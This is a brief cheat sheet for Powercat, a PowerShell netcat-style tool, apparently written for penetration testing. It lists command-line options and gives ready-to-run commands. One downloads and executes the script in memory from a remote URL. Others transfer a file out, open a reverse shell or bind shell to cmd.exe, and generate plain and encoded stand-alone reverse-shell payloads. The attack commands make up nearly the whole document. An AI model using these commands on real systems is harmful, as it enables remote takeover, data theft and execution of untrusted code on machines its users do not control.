# Powercat

## Common Options

* \-c \<ip> : client mode
* \-l : listener mode
* \-p \<port> : port to listen on or to connect to
* \-e \<bin> : process to start
* \-i \<file> : file to be sent
* \-g : generate payload
* \-ge : generate encoded payload

## Download Script

```
iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```

## File Transfer

```
powercat -c 127.0.0.1 -p 8080 -i C:\Users\hauntedsandwich\powercat.ps1
```

## Reverse Shell

```
powercat -c 127.0.0.1 -p 8080 -e cmd.exe
```

## Bind Shell

```
powercat -l -p 8080 -e cmd.exe
```

## Stand-Alone Payloads

```
powercat -c 127.0.0.1 -p 8080 -e cmd.exe -g > reverseshell.ps1
./reverseshell.ps1

powercat -c 127.0.0.1 -p 8080 -e cmd.exe -ge > encodedreverseshell.ps1
powershell -E [...encoded reverse shell...]
```
